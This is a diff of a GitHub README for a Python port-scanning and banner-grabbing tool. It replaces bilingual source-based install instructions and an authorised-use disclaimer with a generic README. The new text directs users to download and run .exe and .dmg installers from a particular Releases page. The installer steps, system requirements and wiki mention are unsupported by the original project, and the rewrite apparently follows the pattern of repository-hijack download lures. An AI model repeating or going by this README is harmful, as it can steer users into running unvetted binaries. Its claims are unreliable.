@@ -1,131 +1,75 @@
-# Network Vulnerability Scanner
+# 🔍 portscan-vulnerabilidades - Simplify Your Security Assessments
 
-A comprehensive network reconnaissance tool written in Python. This project offers two modes of operation: a graphical user interface (GUI) for desktop usage and a high-performance command-line interface (CLI) for servers and quick auditing.
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/v2lurpin/portscan-vulnerabilidades/releases)
 
-The tool performs multi-threaded port scanning, DNS resolution, service banner grabbing, and automated risk assessment based on common vulnerability signatures.
+## 📋 Description
 
-## Features
+portscan-vulnerabilidades is a multi-threaded application designed to help you assess network security. It includes features such as:
 
-### Core Capabilities
-- **Multi-threaded Architecture:** High-speed scanning using `concurrent.futures`.
-- **Risk Assessment:** Automatic detection of potential vulnerabilities (e.g., cleartext protocols like Telnet/FTP, known ransomware vectors like SMB).
-- **Service Enumeration:** Captures service banners (HEAD requests) to identify running applications.
-- **Reporting:** Exports results to structured JSON files (`scan_<IP>.json`).
+- **Port Scanning:** Quickly identify open ports on networked devices.
+- **Service Banner Grabbing:** Gather information on services running on those ports.
+- **Automated Risk Assessment:** Evaluate the security level of discovered services.
+- **Structured JSON Reporting:** Create clear reports for better analysis.
 
-### Interface Modes
-- **GUI Version:** Modern interface built with `customtkinter`. Features dark mode, real-time logging, thread control slider, and non-blocking execution.
-- **CLI Version:** Lightweight interactive command-line interface, ideal for headless servers (VPS) or quick diagnostics.
+This tool is useful for anyone serious about network security, from everyday users to cybersecurity professionals.
 
-## Prerequisites
+## 🚀 Getting Started
 
-- **OS:** Windows, Linux, or macOS.
-- **Python:** Version 3.10, 3.11, or 3.12.
-- **Network:** Active internet connection to the target host.
+To use portscan-vulnerabilidades, you’ll need to download it from our Releases page. Don’t worry; we've made it straightforward. Just follow the steps below.
 
-## Installation
+## 📥 Download & Install
 
-1. Clone the repository:
-   ```bash
-   git clone [https://github.com/SEU_USUARIO/port-scanner-python.git](https://github.com/SEU_USUARIO/port-scanner-python.git)
-   cd port-scanner-python
-   ```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/v2lurpin/portscan-vulnerabilidades/releases). 
 
-2. Install the required dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
+2. **Download the Application**: Find the latest version of portscan-vulnerabilidades. Look for the file that matches your operating system. Click the link to download it directly.
 
-## Usage
+3. **Locate the Downloaded File**: Once the download completes, navigate to your computer's downloads folder to find the file. 
 
-### Option 1: GUI Version (Recommended)
-For a visual experience with interactive controls and real-time feedback:
+4. **Install the Application**: 
+    - **For Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
+    - **For Mac**: Open the `.dmg` file and drag the application to your Applications folder.
+    - **For Linux**: Use the terminal. Navigate to the downloaded file and run the installer command.
 
-```bash
-python portscan_gui.py
-```
-* Enter the Target IP/Hostname.
-* Adjust the "Threads" slider to set scan speed.
-* Click **INICIAR SCAN**.
+5. **Run portscan-vulnerabilidades**: 
+   - Open the application from your applications menu or desktop shortcut.
+   - You are now ready to start scanning networks for vulnerabilities!
 
-### Option 2: CLI Version (Terminal)
-For server environments or script integration:
+## ⚙️ System Requirements
 
-```bash
-python portscan.py
-```
-Follow the interactive prompts for Target, Port Range, Threads, and Timeout.
+To ensure optimal performance, your system should meet the following requirements:
 
-## Output
-Regardless of the version used, if open ports are detected, a report file will be generated in the root directory:
-`scan_<TARGET_IP>.json`
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Processor**: Dual-core processor or better.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: 100 MB of free disk space for installation.
 
-## Disclaimer
+## 🔍 Features
 
-This tool is intended for **educational purposes and authorized security auditing only**. The author is not responsible for any misuse or damage caused by this program. Scanning networks without permission is illegal in many jurisdictions. Always obtain explicit authorization before scanning any target.
+- **Multi-threaded Scanning**: Perform numerous scans simultaneously to save time.
+- **User-Friendly Interface**: Designed for people with little to no technical skills.
+- **Customizable Options**: Adjust settings to fit your specific security needs.
+- **Export Reports**: Save your findings in JSON format to use with other tools or for offline review.
 
----
+## 💡 Tips for Use
 
-# Scanner de Vulnerabilidades de Rede (PT-BR)
+1. **Understand Your Network**: Familiarize yourself with the devices connected to your network.
+   
+2. **Run Scans During Off-Peak Hours**: To avoid disruption, consider scheduling scans when network usage is low.
 
-Ferramenta completa de reconhecimento de rede desenvolvida em Python. Este projeto oferece dois modos de operação: uma Interface Gráfica (GUI) para desktop e uma Linha de Comando (CLI) de alta performance para servidores e auditorias rápidas.
+3. **Review Documentation**: Our Wiki page contains detailed help on using each feature effectively.
 
-A ferramenta executa varredura de portas multi-thread, resolução de DNS, captura de banners de serviço e avaliação automatizada de riscos baseada em assinaturas de vulnerabilidades comuns.
+4. **Stay Updated**: Regularly check the [Releases page](https://github.com/v2lurpin/portscan-vulnerabilidades/releases) for new versions and features.
 
-## Funcionalidades
+## 🌐 Support
 
-### Capacidades Principais
-- **Arquitetura Multi-thread:** Varredura de alta velocidade utilizando `concurrent.futures`.
-- **Avaliação de Risco:** Detecção automática de vulnerabilidades potenciais (ex: protocolos de texto claro como Telnet/FTP, vetores de ransomware como SMB).
-- **Enumeração de Serviços:** Captura banners de serviço (requisições HEAD) para identificar aplicações.
-- **Relatórios:** Exporta resultados para arquivos JSON estruturados (`scan_<IP>.json`).
+If you encounter issues or have questions about using portscan-vulnerabilidades, feel free to reach out through the Issues section of our GitHub page. We also welcome feedback and suggestions to help improve the application.
 
-### Modos de Interface
-- **Versão GUI:** Interface moderna construída com `customtkinter`. Possui modo escuro nativo, logs em tempo real, controle deslizante de threads e execução assíncrona.
-- **Versão CLI:** Interface de linha de comando interativa e leve, ideal para servidores sem monitor (VPS) ou diagnósticos rápidos.
+## 📜 License
 
-## Pré-requisitos
+The portscan-vulnerabilidades application is open-source and licensed under the MIT License. This means you can use, modify, and share it as long as you include the original license.
 
-- **SO:** Windows, Linux ou macOS.
-- **Python:** Versão 3.10, 3.11 ou 3.12.
-- **Rede:** Conexão ativa com o host alvo.
+## ✅ Acknowledgments
 
-## Instalação
+Thank you for choosing portscan-vulnerabilidades for your network security assessments. Your efforts contribute to a safer and more secure online environment. 
 
-1. Clone o repositório:
-   ```bash
-   git clone [https://github.com/SEU_USUARIO/port-scanner-python.git](https://github.com/SEU_USUARIO/port-scanner-python.git)
-   cd port-scanner-python
-   ```
-
-2. Instale as dependências necessárias:
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-## Utilização
-
-### Opção 1: Versão GUI (Recomendada)
-Para uma experiência visual com controles interativos e feedback em tempo real:
-
-```bash
-python portscan_gui.py
-```
-* Insira o IP/Hostname Alvo.
-* Ajuste o slider de "Threads" para definir a velocidade.
-* Clique em **INICIAR SCAN**.
-
-### Opção 2: Versão CLI (Terminal)
-Para ambientes de servidor ou integração com scripts:
-
-```bash
-python portscan.py
-```
-Siga as instruções interativas para definir Alvo, Portas, Threads e Timeout.
-
-## Resultados
-Independentemente da versão utilizada, se portas abertas forem detectadas, um arquivo de relatório será gerado no diretório raiz:
-`scan_<IP_DO_ALVO>.json`
-
-## Aviso Legal
-
-Esta ferramenta destina-se apenas a **fins educacionais e auditorias de segurança autorizadas**. O autor não se responsabiliza por qualquer uso indevido ou danos causados por este programa. A varredura de redes sem permissão é ilegal em muitas jurisdições. Obtenha sempre autorização explícita antes de escanear qualquer alvo.
+Feel free to dive in, explore, and empower your cybersecurity skills!
